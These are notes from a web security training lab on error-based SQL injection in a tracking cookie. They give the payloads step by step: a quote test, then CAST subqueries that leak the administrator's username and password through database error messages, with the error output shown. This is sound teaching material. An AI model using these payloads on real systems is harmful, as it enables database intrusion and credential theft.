## Lab: Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

---

## Notes

1/ Confirm that the parameter is vulnerable

```sql
QiTJO70LBoOePWeb'
```

```text
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'QiTJO70LBoOePWeb''. Expected  char
```

```sql
QiTJO70LBoOePWeb'--
```

2/ Confirm that the "administrator" user exists in the "users" table

```sql
QiTJO70LBoOePWeb' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```text
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'QiTJO70LBoOePWeb' AND 1=CAST((SELECT username from users LIM'. Expected  char
```

We can notice that there is word limits.

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```text
ERROR: invalid input syntax for type integer: "administrator"
```

3/ Determine the password of the "administrator" user.

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

```text
ERROR: invalid input syntax for type integer: "3hz6uqgt7i1zijfx0wga"
```

